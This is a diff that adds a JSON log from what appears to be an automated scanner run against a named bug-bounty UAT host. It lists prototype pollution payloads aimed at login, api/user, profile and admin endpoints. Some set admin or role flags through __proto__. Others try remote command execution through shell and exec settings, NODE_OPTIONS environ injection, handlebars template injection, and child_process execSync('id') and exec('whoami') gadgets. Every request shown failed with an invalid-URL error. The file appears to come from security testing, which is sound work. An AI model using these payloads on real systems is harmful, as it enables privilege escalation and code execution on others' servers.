@@ -1,0 +1,534 @@
+[
+  {
+    "vulnerability_id": "vulnerability",
+    "type": "Prototype Pollution",
+    "severity": "CRITICAL",
+    "endpoint": "",
+    "method": "POST",
+    "payload": "",
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.330700",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 2,
+    "type": "Unknown",
+    "severity": "Unknown",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "admin": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.350130",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 3,
+    "type": "Unknown",
+    "severity": "Unknown",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "role": "admin"
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.351194",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 4,
+    "type": "Unknown",
+    "severity": "Unknown",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "isAdmin": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.352390",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 5,
+    "type": "Unknown",
+    "severity": "Unknown",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "privileged": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.353430",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 6,
+    "type": "Unknown",
+    "severity": "Unknown",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "authorized": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.354581",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 7,
+    "type": "Unknown",
+    "severity": "CRITICAL",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "shell": "/bin/bash",
+        "argv0": "bash",
+        "exec": "whoami"
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.355532",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 8,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/user",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "shell": "/bin/bash",
+        "argv0": "bash",
+        "exec": "whoami"
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.356550",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 9,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/profile",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "shell": "/bin/bash",
+        "argv0": "bash",
+        "exec": "whoami"
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.357561",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 10,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/admin",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "shell": "/bin/bash",
+        "argv0": "bash",
+        "exec": "whoami"
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.358468",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 11,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "env": {
+          "NODE_OPTIONS": "--require /proc/self/environ"
+        },
+        "shell": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.359342",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 12,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/user",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "env": {
+          "NODE_OPTIONS": "--require /proc/self/environ"
+        },
+        "shell": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.359994",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 13,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/profile",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "env": {
+          "NODE_OPTIONS": "--require /proc/self/environ"
+        },
+        "shell": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.360523",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 14,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/admin",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "env": {
+          "NODE_OPTIONS": "--require /proc/self/environ"
+        },
+        "shell": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.361020",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 15,
+    "type": "Unknown",
+    "severity": "CRITICAL",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "template": "{{7*7}}",
+        "engine": "handlebars",
+        "compile": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.361751",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 16,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/user",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "template": "{{7*7}}",
+        "engine": "handlebars",
+        "compile": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.362214",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 17,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/profile",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "template": "{{7*7}}",
+        "engine": "handlebars",
+        "compile": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.362642",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 18,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/admin",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "template": "{{7*7}}",
+        "engine": "handlebars",
+        "compile": true
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.363036",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 19,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "constructor": {
+          "prototype": {
+            "toString": "function(){return process.mainModule.require('child_process').execSync('id')}"
+          }
+        }
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.363447",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 20,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/user",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "constructor": {
+          "prototype": {
+            "toString": "function(){return process.mainModule.require('child_process').execSync('id')}"
+          }
+        }
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.363881",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 21,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/profile",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "constructor": {
+          "prototype": {
+            "toString": "function(){return process.mainModule.require('child_process').execSync('id')}"
+          }
+        }
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.364303",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 22,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/admin",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "constructor": {
+          "prototype": {
+            "toString": "function(){return process.mainModule.require('child_process').execSync('id')}"
+          }
+        }
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.364743",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 23,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "type": "Program",
+        "body": [
+          {
+            "type": "MustacheStatement",
+            "path": "require('child_process').exec('whoami')"
+          }
+        ]
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.365188",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 24,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/api/user",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "type": "Program",
+        "body": [
+          {
+            "type": "MustacheStatement",
+            "path": "require('child_process').exec('whoami')"
+          }
+        ]
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.365599",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 25,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/profile",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "type": "Program",
+        "body": [
+          {
+            "type": "MustacheStatement",
+            "path": "require('child_process').exec('whoami')"
+          }
+        ]
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.366011",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  },
+  {
+    "vulnerability_id": 26,
+    "type": "Unknown",
+    "severity": "HIGH",
+    "endpoint": "https://uat-bugbounty.nonprod.syfe.com/admin",
+    "method": "POST",
+    "payload": {
+      "__proto__": {
+        "type": "Program",
+        "body": [
+          {
+            "type": "MustacheStatement",
+            "path": "require('child_process').exec('whoami')"
+          }
+        ]
+      }
+    },
+    "status": "FAILED",
+    "response_time": 0,
+    "response_code": 0,
+    "response_preview": "",
+    "timestamp": "2025-06-08T19:43:50.366432",
+    "error": "Invalid URL '': No scheme supplied. Perhaps you meant https://?"
+  }
+]
